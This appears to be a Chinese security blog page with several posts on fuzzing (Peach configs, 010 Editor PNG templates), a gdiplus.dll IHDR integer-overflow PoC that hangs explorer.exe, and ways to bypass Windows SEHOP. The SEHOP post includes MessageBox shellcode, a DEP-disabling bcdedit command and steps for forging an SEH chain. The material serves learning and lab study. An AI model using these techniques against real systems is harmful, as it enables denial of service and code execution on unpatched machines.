<pre><code>&lt;StateModel name="TheState" initialState="Initial"&gt;
    &lt;State name="Initial"&gt;
        &lt;!-- Write out our png file --&gt;
        &lt;Action type="output"&gt;
            &lt;DataModel ref="Png" /&gt;
            &lt;!-- This is our sample file to read in --&gt;
            &lt;Data name="data" fileName="sample.png" /&gt;
        &lt;/Action&gt;
    &lt;/State&gt;

    &lt;!-- Close file --&gt;
    &lt;Action type="close"/&gt;

    &lt;!-- Launch the target process --&gt;
    &lt;Action type="call" method="D:\tweakpng.exe"&gt;
        &lt;Param name="png file" type="in"&gt;
            &lt;DataModel ref="Param" /&gt;
            &lt;Data name="fileName"&gt;
                &lt;!-- Name of Fuzzed output file --&gt;
                &lt;Field name="Value" value="peach.png" /&gt;
            &lt;/Data&gt;
        &lt;/Param&gt;
    &lt;/Action&gt;
&lt;/StateModel&gt;
</code></pre>

<p>在call动作中我们引入了&quot;Param&quot;的数据类型，这个数据模型用来存放传达给pngcheck.exe/tweakpng.exe的参数，即畸形文件的文件名。所以&quot;Param&quot;需要包含一个名为&quot;Value&quot;的字符型静态数据。<br>所以需要在StateModel之前定义该数据模型:</p>
<pre><code>&lt;DataModel name="Param"&gt;
    &lt;String name="Value" isStatic="true" /&gt;
&lt;/DataModel&gt;
</code></pre>

<p>然后在Test元素中配置Publisher信息。这里需要FileWriterLauncher，它能在写完文件后使用call动作启用一个线程。</p>
<pre><code>&lt;Test name="TheTest"&gt;
    &lt;StateModel ref="TheState"/&gt;
    &lt;Publisher class="file.FileWriterLauncher"&gt;
        &lt;Param name="filename" value="peach.png" /&gt;
    &lt;/Publisher&gt;
&lt;/Test&gt;
</code></pre>

<p>最后在Run信息配置中指定要运行的测试名称</p>
<pre><code>&lt;Run name="DefaultRun"&gt;
    &lt;Test ref="TheTest" /&gt;
&lt;/Run&gt;
</code></pre>

<p>接下来对png_dumb.xml进行一些改动，让程序调用windows资源管理器打开畸形文件。<br>首先，在StateModel的Action中将tweakpng.exe程序替换为&quot;explorer&quot;<br>然后，在Publisher配置中将class改为file.FileWriterLauncherGui，并且为Publisher增加一个名为WindowName、值为peach.png的参数</p>
<p>FileWriterLauncherGui与FileWriterLauncher的区别:前者用于运行带界面的GUI程序，并且在运行后会自动关闭窗口标题中含有WindowName的值的GUI窗口。</p>
<p>为了捕获程序的异常，还需配置Agent and Monitor，调用WinDbg进行测试。</p>
<p>首先将StateModel中最后一个Action删掉，并添加这一行</p>
<pre><code>&lt;Action type="call" method="ScoobySnacks" /&gt;
</code></pre>

<p>然后在StateModel下面加入Agent配置</p>
<pre><code>&lt;Agent name="LocalAgent"&gt;
    &lt;Monitor class="debugger.WindowsDebugEngine"&gt;
        &lt;Param name="CommandLine" value="explorer peach.png"/&gt;
        &lt;Param name="StartOnCall" value="ScoobySnacks" /&gt;
    &lt;/Monitor&gt;

    &lt;Monitor class="process.PageHeap"&gt;
        &lt;Param name="Executable" value="explorer" /&gt;
    &lt;/Monitor&gt;
&lt;/Agent&gt;
</code></pre>

<p>然后在Test配置的第一行加入:</p>
<pre><code>&lt;Agent ref="LocalAgent" /&gt;
</code></pre>

<p>并且在Publisher的最后一行加入名为debugger，值为true的参数</p>
<pre><code>&lt;Param name="debugger" value="true" /&gt;
</code></pre>

<p>最后在Run配置的Test元素后面加入日志配置:</p>
<pre><code>&lt;Logger class="logger.Filesystem"&gt;
    &lt;Param name="path" value="logs" /&gt;
&lt;/Logger&gt;
</code></pre>

<p>重新运行Fuzzer，实验效果是Fuzzer程序启动了一个Local Peach Agent，通过该Agent控制WinDbg进行调试并捕获异常事件。</p>
<font color="#f00"><br>本次实验其实很简单，但是环境一定得按照要求来。<br>windbg 版本为 6.8，是否是x86，抑或是amd64，得与python安装版本一致；<br>python 版本为2.5+，一定是版本2<br>peach 版本为v2.3。该版本能与windbg 6.8兼容，但是不能与6.12兼容。<br></font>

<h3 id="3-010脚本"><a href="#3-010脚本" class="headerlink" title="3. 010脚本"></a>3. 010脚本</h3><h4 id="3-1-010-Editor简介"><a href="#3-1-010-Editor简介" class="headerlink" title="3.1 010 Editor简介"></a>3.1 010 Editor简介</h4><p>010 Editor是文本/十六进制编辑器，还包括文件解析、计算器、文本比较等功能。其可以通过官方网站提供的脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。</p>
<p>以PNG文件解析为例：用010 Editor打开PNG文件，然后通过Templates-&gt;Open Template菜单打开PNGTemplate.bt，按F5键运行脚本，在窗口中选择该PNG文件，就可以看到解析结果。</p>
<h4 id="3-2-010脚本编写入门"><a href="#3-2-010脚本编写入门" class="headerlink" title="3.2 010脚本编写入门"></a>3.2 010脚本编写入门</h4><p>010 Editor分析脚本与C/C++的结构体定义比较类似。但是其是一个自上而下执行的程序，可以使用if、for、while等语句。</p>
<pre><code>char header[4];
int numRecords;
</code></pre>

<p>意味着文件 首4个字节将会映射到字符数组header中，下4个字节则会映射到整型变量numRecords中，并最终显示在解析结果中。<br>但是也可能有这种情况：需要定义一些变量，但是这些变量并不对应着文件中的任何字节，而仅仅是程序运行中所需要的，这时可用哪个local关键字来定义变量。</p>
<pre><code>local int i, total=0;
int RecordCounts[5];
for(i=0; i&lt;5; i++)
    total += recordCounts[i];
double records[total];
</code></pre>

<p>另外在数据的定义中，可以加上一些附加属性，如格式、颜色、注释等。附加属性用尖括号&lt;&gt;括起来。常用的属性包括：</p>
<pre><code>&lt;format=hex|decimal|octal|binary, fgcolor=&lt;color&gt;, bgcolor=&lt;color&gt;, comment="&lt;string&gt;", open=true|false|suppress, hidden=true|false, read=&lt;function_name&gt;, write=&lt;function_name&gt; &gt;
</code></pre>

<p>实例：<br>文件格式示例如图所示:<br><img src="/images/2017-07-28/file_structure.jpg" alt="文件格式"><br>脚本如下：</p>
<pre><code>struct FILE{
    struct HEADER{
        char type[4];
        int version;
        int numRecords;
    } header;

    struct RECORD{
        int len;
        char name[20];
        if(file.header.version == 1)
            char data[len];
        if(file.header.version == 2)
            byte data[len];
    } record[file.header.numRecords];

} file;
</code></pre>

<h4 id="3-3-010脚本编写提高——PNG文件解析"><a href="#3-3-010脚本编写提高——PNG文件解析" class="headerlink" title="3.3 010脚本编写提高——PNG文件解析"></a>3.3 010脚本编写提高——PNG文件解析</h4><p>首先定义PNG签名和Chunk两种结构，PNG文件签名：</p>
<pre><code>const uint64 PNGMAGIC = 0x89504E470D0A1A0AL;
</code></pre>

<p>然后是PNG的Chunk格式:</p>
<pre><code>typedef struct{
    uint32 length;
    char ctype[4];
    ubyte data[length];
    uint32 crc &lt;format=hex&gt;;
} CHUNK
</code></pre>

<p>还需定义CHUNK结构体的read函数，以便在显示解析结果时能够给出每个Chunk的名字，显然ctype的值可以作为Chunk的名字。在ctype中，每个字节的第三位还分别标识了该Chunk的一些附加信息：</p>
<table>
<thead>
<tr>
<th>位置</th>
<th>1</th>
<th>0</th>
</tr>
</thead>
<tbody>
<tr>
<td>第1字节的第3位</td>
<td>Ancillary</td>
<td>Critical</td>
</tr>
<tr>
<td>第2字节的第3位</td>
<td>Private</td>
<td>Public</td>
</tr>
<tr>
<td>第3字节的第3位</td>
<td>ERROR_RESERVED</td>
<td></td>
</tr>
<tr>
<td>第4字节的第3位</td>
<td>Safe to Copy</td>
<td>UnSafe to Copy</td>
</tr>
</tbody>
</table>
<p>说明:</p>
<ul>
<li>Ancillary标识该区块是辅助区块，该区块可有可无；Critical表示该区块是关键区块，这些区块是必须的</li>
<li>Private表示该区块是不在PNG标准规格(PNG specification)区块中，属于该PNG文件私有，其名称的第二个字母是小写；Public表示该区块属于PNG标准区块，其名称的第二个字母是大写。</li>
<li>Safe to Copy表示该区块与图像数据无关，可以随意复制到改动过的PNG文件中；Unsafe to Copy表示该区块内容与图像数据息息相关，如果对文件的Critical区块进行了增删改等操作，则该区块也需要进行相应的修改</li>
</ul>
<p>于是CHUNK结构定义如下函数：</p>
<pre><code>string readCHUNK(local CHUNK &c){
    local string s;
    s = c.ctype + "  (";
    s += (c.ctype[0] & 0x20) ? "Ancillary, " : "Critical, ";
    s += (c.ctype[1] & 0x20) ? "Private, "   : "Public, ";
    s += (c.ctype[2] & 0x20) ? "ERROR_RESERVED, " : "";
    s += (c.ctype[3] & 0x20) ? "Safe to Copy)" : "Unsafe to Copy)";
    return s;
}
</code></pre>

<p>同时在定义好的CHUNK结构体后加上read属性，即把“} CHUNK;”改为:</p>
<pre><code>} CHUNK &lt;read=readCHUNK&gt;
</code></pre>

<p>最后写入解析&quot;主函数&quot;:</p>
<pre><code>uint64 pngid &lt;format=hex&gt;;

if(pngid != PNGMAGIC){
    Warning("Invalid PNG File: Bad Magic Number");
    return -1;
}

while(!FEof()){
    CHUNK chunk;
}
</code></pre>

<p>另外，由于PNG文件是按照BigEndian格式进行存储的，所以需要在脚本的第一行加入:</p>
<pre><code>BigEndian();
</code></pre>

<p><b>漏洞</b></p>
<p>实验环境<br>操作系统： Win XP SP3<br>GdiPlus.dll版本： 5.1.3102.5512</p>
<p>在之前的PNG解析结果中找到IHDR Chunk的length位置，也就是第9-12字节，通常情况下其值为13(0x0D)，现在换成0xFFFFFFF4，并将文件另存为poc.png。<br>在实验环境下打开poc.png，打开资源管理器，会发现explorer.exe的CPU占用率升至100%，使系统接近宕机状态，只有强行结束或者重启explorer.exe进程才能使系统恢复正常。</p>
<p>实际上gdiplus.dll在处理IHDR时存在整数溢出漏洞。该漏洞的危害：</p>
<ol>
<li>打开poc.png或者打开poc.png所在文件夹的未打补丁的用户死机</li>
<li>将poc.png挂载某网页上，访问该页面的未打补丁用户死机</li>
<li>设为QQ或MSN头像，查看头像的未打补丁用户死机</li>
</ol>
<h4 id="3-4-PPT文件解析"><a href="#3-4-PPT文件解析" class="headerlink" title="3.4 PPT文件解析"></a>3.4 PPT文件解析</h4><p>office系列软件使用的文件格式分为两个：<br>Office97~Office2003：使用基于二进制的文件格式，文件名后缀为doc、ppt、xls等<br>Office2003及更高版本：使用基于XML的文件格式，文件名后缀为docx、pptx、xlsx等。</p>
<p>本节以PowerPoint97~2003所用的二进制文件格式，PPT文件的解析过程从逻辑上分为如下四层：</p>
<table>
<thead>
<tr>
<th>测试深度</th>
<th>解析逻辑</th>
<th>数据粒度</th>
<th>Fuzz方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>Level1</td>
<td>OLE2 解析器</td>
<td>离散分布的512字节数据段</td>
<td>修改OLE文件头、FAT区块、目录区块等位置的数据结构</td>
</tr>
<tr>
<td>Level2</td>
<td>PPT 记录解析器</td>
<td>流和信息库</td>
<td>修改流中的数据，破坏记录头和数据的关系</td>
</tr>
<tr>
<td>Level3</td>
<td>PPT 对象创建器</td>
<td>原子和容器</td>
<td>用负载替换原子数据</td>
</tr>
<tr>
<td>Level4</td>
<td>PPT 对象内部逻辑</td>
<td>原子记录内部的integer、bool、string等类型数据</td>
<td>用相关的负载修改字节数据</td>
</tr>
</tbody>
</table>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/28/漏洞挖掘技术简介/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/28/漏洞挖掘技术简介/" itemprop="url">漏洞挖掘技术简介</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-28T13:58:56+08:00">
                2017-07-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-漏洞挖掘概述"><a href="#1-漏洞挖掘概述" class="headerlink" title="1. 漏洞挖掘概述"></a>1. 漏洞挖掘概述</h3><h4 id="1-1-Fuzz测试"><a href="#1-1-Fuzz测试" class="headerlink" title="1.1 Fuzz测试"></a>1.1 Fuzz测试</h4><p>这是一种黑盒测试，与基于功能性的测试有所不同，Fuzz主要目的是&quot;crash&quot;、&quot;break&quot;、&quot;destroy&quot;。</p>
<p>Fuzz的测试用例往往是带有攻击性的畸形数据，用以触发各种类型的漏洞。</p>
<p>Fuzz测试的优点：很少出现误报，能够快速找到真正的漏洞<br>Fuzz测试的缺点：永远不能保证系统中已经没有漏洞</p>
<h4 id="1-2-学术界与工业界的区别"><a href="#1-2-学术界与工业界的区别" class="headerlink" title="1.2 学术界与工业界的区别"></a>1.2 学术界与工业界的区别</h4><p>学术界偏向于<font color="#f00">对源代码进行静态分析</font>，直接在程序的逻辑上寻找漏洞。方法和理论有：(可追溯于1976年在ACM Computing Surveys上的论文Data Flow Analysis Software Reliability)</p>
<ul>
<li>数据流分析</li>
<li>类型验证系统</li>
<li>边界检验系统</li>
<li>状态机系统等</li>
</ul>
<h4 id="1-3-审计源代码的工具"><a href="#1-3-审计源代码的工具" class="headerlink" title="1.3 审计源代码的工具"></a>1.3 审计源代码的工具</h4><ol>
<li>Fortify在编译阶段扫描若干安全风险</li>
<li>Rough Auditing Tool for Security(RATS)用于分析C/C++语言的语法树，寻找存在潜在安全问题的函数调用</li>
<li>BEAM(Bugs Errors And Mistakes)，IBM的静态代码分析工具，使用数据楼分析的方法，分析源代码的所有可执行路径，以检测代码中潜在的bug</li>
<li>SLAM用于检测驱动中的bug</li>
<li>Flaw Finder用Python语言开发的代码分析工具</li>
<li>Prexis可审计多种语言的源代码，审计的漏洞类型超过30种</li>
</ol>
<h3 id="2-动态测试技术"><a href="#2-动态测试技术" class="headerlink" title="2. 动态测试技术"></a>2. 动态测试技术</h3><h4 id="2-1-SPIKE"><a href="#2-1-SPIKE" class="headerlink" title="2.1 SPIKE"></a>2.1 SPIKE</h4><p>SPIKE是Protocol Fuzz(针对网络协议的模糊测试)工具<br><img src="/images/2017-07-28/block_data.jpg" alt="基于Block的数据定义方法"></p>
<p>spike运行在linux环境下，当然对代码进行一定的修改之后就可以运行在windows上。<br>Dave Aitel实现了一套功能强大的API和数据结构用于定义数据块。SPIKE就是这样一套函数与数据结构的集合。</p>
<p>Hello World用例：</p>
<h4 id="2-2-beSTORM简介"><a href="#2-2-beSTORM简介" class="headerlink" title="2.2 beSTORM简介"></a>2.2 beSTORM简介</h4><p>由Beyond Security安全公司开发，运行在windows上的一款全能型安全审计程序，其利用模糊测试技术实现对网络协议的安全测试。</p>
<h3 id="3-静态代码审计"><a href="#3-静态代码审计" class="headerlink" title="3. 静态代码审计"></a>3. 静态代码审计</h3><p>Coverity是用来提高软件质量的源代码静态分析工具。<br>Coverity使用checker模块来检测漏洞，默认情况下的checker包括：</p>
<ol>
<li>C checkers，内存错误、缓冲区溢出、函数的参数及返回值</li>
<li>Concurrency checkers，线程同步、锁机制等</li>
<li>Security checker，可信数据流的分析、字符串溢出等</li>
</ol>
<p>所有静态代码分析的理论和技术都面临的棘手问题：<br>如何处理程序逻辑中由动态因素引起的复杂条件分支和循环</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/18/攻击SEHOP的方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/18/攻击SEHOP的方法/" itemprop="url">攻击SEHOP的方法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-18T13:40:19+08:00">
                2017-07-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-攻击返回地址"><a href="#1-攻击返回地址" class="headerlink" title="1. 攻击返回地址"></a>1. 攻击返回地址</h3><p>如果程序启用了SEHOP但是未启用GS，或者启用了GS但是刚好被攻击的函数没有GS保护，那么就可以供给函数的返回地址！</p>
<h3 id="2-攻击虚函数"><a href="#2-攻击虚函数" class="headerlink" title="2. 攻击虚函数"></a>2. 攻击虚函数</h3><p>SEHOP保护的只是SEH，对于SEH以外的不提供保护。所以我们可以通过攻击虚函数来劫持程序流程，这个过程不涉及任何异常处理。</p>
<h3 id="3-利用未启用SEHOP的模块"><a href="#3-利用未启用SEHOP的模块" class="headerlink" title="3. 利用未启用SEHOP的模块"></a>3. 利用未启用SEHOP的模块</h3><p>出于兼容性的考虑，对一些程序禁用了SEHOP，如经过Armadilo加壳的软件。</p>
<p>操作系统会根据PE头MajorLinkerVersion和MinorLinkerVersion两个选项来判断是否为程序禁用SEHOP。可以将这两个选项设置为0x53和0x52来模拟经过Armadilo加壳的程序，从而达到禁用SEHOP的目的！</p>
<p>此处是通过CFF Explorer来进行这种处理<br><img src="/images/2017-07-18/set_version.jpg" alt="CFF Explorer修改PE头来禁用SEHOP"></p>
<h4 id="3-1-实验代码"><a href="#3-1-实验代码" class="headerlink" title="3.1 实验代码"></a>3.1 实验代码</h4><h4 id="3-2-实验内容"><a href="#3-2-实验内容" class="headerlink" title="3.2 实验内容"></a>3.2 实验内容</h4><p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用的环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>windows 7</td>
<td></td>
</tr>
<tr>
<td>EXE编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>DLL编译器</td>
<td>VC++ 6.0</td>
<td>将dll基址设置为0x11120000</td>
</tr>
<tr>
<td>系统SEHOP</td>
<td>启用</td>
<td></td>
</tr>
<tr>
<td>秩序DEP</td>
<td>关闭</td>
<td></td>
</tr>
<tr>
<td>程序ASLR</td>
<td>EXE随意，DLL禁用</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p><b>windows 7 下的弹出对话框的shellcode</b></p>
<pre><code>
char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09<font color="#f00">\x8B\x09</font>\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
</code></pre>

<p>上面代码中的红字是与xp和window 2000中不同的shellcode之处，其指代的意思是mov ecx, [ecx]<br>之所以在此处多加这一句，是因为ntdll.dll链的下一个为KERNELBASE.dll，而它下一个才是kernel32.dll，这也是win7与之前的系统的不同之处！</p>
<p>本次实验是在&quot;利用未启用SafeSEH模块&quot;实验的基础上进行的</p>
<p>win7中关闭DEP的方法：cmd窗口中<br>bcdedit.exe/set {current} nx AlwaysOff pause</p>
<p>首先为SEH_NOSafeSEH_JUMP.dll禁用SEHOP，使用CFF Explorer打开SEH_NOSafeSEH_JUMP.dll后在Optional header选项页中来进行设置，分别将MajorLinkerVersion和MinorLinkerVersion设置为0x53和0x52。这个如上图</p>
<p>然后对演示的主程序进行一定的修改：</p>
<ol>
<li>修改弹出对话框的shellcode，让其可以在windows 7下正常弹出</li>
<li>取消程序的/NXCOMPAT链接选项来禁用程序的DEP</li>
</ol>
<font color="#f00">不知道什么原因，到目前为止，我还没有实现弹出对话框的效果</font>

<h3 id="4-伪造SEH链表"><a href="#4-伪造SEH链表" class="headerlink" title="4. 伪造SEH链表"></a>4. 伪造SEH链表</h3><p>伪造SEH是非常困难的，首先需要系统的ASLR不能启用，因为伪造SEH链时需要用到FinalExceptionHandler指向的地址，如果每次系统重启后这个地址都变化的话，溢出的成功率将大大降低。</p>
<h4 id="4-1-实验代码"><a href="#4-1-实验代码" class="headerlink" title="4.1 实验代码"></a>4.1 实验代码</h4><h4 id="4-2-实验内容"><a href="#4-2-实验内容" class="headerlink" title="4.2 实验内容"></a>4.2 实验内容</h4><p>伪造SEH链绕过SEHOP所需的条件：</p>
<ol>
<li>下图中的0xXXXXXXXX地址必须指向当前栈中，而且必须能够被4整除</li>
<li>0xXXXXXXXX处存放的异常处理记录作为SEH链的最后一项，其异常处理函数指针必须指向终极异常处理函数</li>
<li>突破SEHOP检查后，溢出程序还需搞定SafeSEH</li>
</ol>
<p><img src="/iamges/2017-07-18/seh.jpg" alt="伪造SEH链示意图"></p>
<p>为了方便，本实验在&quot;利用未启用SafeSEH模块绕过SafeSEH&quot;的基础上进行，不用考虑SafeSEH问题，只需确定0xXXXXXXXX的值和FinalExceptionHandler指向的地址即可。</p>
<p><b>实验思路</b></p>
<ol>
<li>通过未启用SafeSEH的SEH_NOSafeSEH_JUMP.dll来绕过SafeSEH</li>
<li>通过伪造SEH链，造成SEH链未被破坏的假象来绕过SEHOP</li>
<li>SEH_NOSafeSEH中的test函数存在典型的溢出</li>
<li>使用SEH_NOSafeSEH_JUMP.dll中的“pop pop retn”指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理，通过劫持异常处理流程，程序转入SEH_NOSafeSEH_JUMP.DLL中执行&quot;pop pop retn&quot;指令，在执行retn后程序转入shellcode执行</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用的环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>windows 7</td>
<td></td>
</tr>
<tr>
<td>EXE编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>DLL编译器</td>
<td>VC++ 6.0</td>
<td>将dll基址设置为0x11120000</td>
</tr>
<tr>
<td>系统SEHOP</td>
<td>启用</td>
<td></td>
</tr>
<tr>
<td>秩序DEP</td>
<td>关闭</td>
<td></td>
</tr>
<tr>
<td>程序ASLR</td>
<td>关闭</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/17/SEHOP原理/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/17/SEHOP原理/" itemprop="url">SEHOP原理</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-17T18:48:47+08:00">
                2017-07-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-SEHOP简介"><a href="#1-SEHOP简介" class="headerlink" title="1. SEHOP简介"></a>1. SEHOP简介</h3><p>SEHOP(Structured Exception Handling Overwrite Protection)是一种比SafeSEH更为严厉的保护机制。截至2009年，Windows Vista SP1、Windows 7、Windows Server 2008和Windows Server 2008 R2均支持SEHOP。</p>
<p>SEHOP在Windows Server 2008是默认启用，而在Windows Vista和Windows 7中SEHOP默认是关闭的，可以通过下面两种方法启用SEHOP：</p>
<ol>
<li>手工在注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Manager\kernel下面找到DisableExceptionChainValidation项，将其值设置为0，即可以启用SEHOP</li>
</ol>
<p>SEHOP的核心任务是检查这条SEH链的完整性，在程序转入异常处理前SEHOP会检查SEH链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果是，则说明这条SEH链没有被破坏，程序可以执行当前的异常处理函数；如果检测到最后一个异常处理函数不是最终的默认异常处理，则说明SEH链被破坏，可能发生了SEH覆盖攻击，程序将不会去执行当前的异常处理函数。</p>
<p>验证代码如下：</p>
<pre><code>
BOOL RtlIsValidHandler(handler)
{
        if (handler is in an image) {
                if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set)
                        return FALSE;
                if (image has a SafeSEH table)
                if (handler found in the table)
                        return TRUE;
                else
                        return FALSE;
                if (image is a .NET assembly with the ILonly flag set)
                        return FALSE;
                // fall through
        }
        if (handler is on a non-executable page) {
                if (ExecuteDispatchEnable bit set in the process flags)
                        return TRUE;
                else
                // enforce DEP even if we have no hardware NX
                raise ACCESS_VIOLATION;
        }
        if (handler is not in an image) {
                if (ImageDispatchEnable bit set in the process flags)
                        return TRUE;
                else
                        return FALSE; // don't allow handlers outside of images
        }
// everything else is allowed
return TRUE;
}
[...]
// Skip the chain validation if the
DisableExceptionChainValidation bit is set
if (process_flags & 0x40 == 0) {
        // Skip the validation if there are no SEH records on the
        // linked list
        if (record != 0xFFFFFFFF) {
                // Walk the SEH linked list
                do {
                        // The record must be on the stack
                        if (record < stack_bottom || record > stack_top)
                                goto corruption;
                        // The end of the record must be on the stack
                        if ((char*)record + sizeof(EXCEPTION_REGISTRATION) > stack_top)
                                goto corruption;
                        // The record must be 4 byte aligned
                        if ((record & 3) != 0)
                                goto corruption;
                        handler = record->handler;
                        // The handler must not be on the stack
                        if (handler >= stack_bottom && handler < stack_top)
                                goto corruption;
                        record = record->next;
                } while (record != 0xFFFFFFFF);
                // End of chain reached
                // Is bit 9 set in the TEB->SameTebFlags field?
                // This bit is set in ntdll!RtlInitializeExceptionChain,
                // which registers FinalExceptionHandler as an SEH handler
                // when a new thread starts.
                if ((TEB->word_at_offset_0xFCA & 0x200) != 0) {
                        // The final handler must be ntdll!FinalExceptionHandler
                        if (handler != &FinalExceptionHandler)
                                goto corruption;
                }
        }
}
</code></pre>

